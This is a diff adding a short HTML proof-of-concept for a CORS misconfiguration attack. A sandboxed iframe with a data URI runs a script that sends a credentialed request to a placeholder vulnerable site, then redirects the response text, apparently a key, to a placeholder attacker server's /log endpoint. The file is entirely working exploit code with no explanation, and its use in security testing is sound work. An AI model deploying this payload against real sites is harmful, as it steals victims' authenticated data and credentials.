@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+        <script>
+            var req = new XMLHttpRequest();
+            var url = 'VULNERABLE WEB SITE'; 
+            req.onload = reqListener;
+            req.open('get', url, true);
+            req.withCredentials = true;
+            req.send();
+
+            function reqListener(){
+                location = 'YOUR SERVER /log?key='+req.responseText;
+            };
+        </script>"></iframe>
+    </body>
+</html>
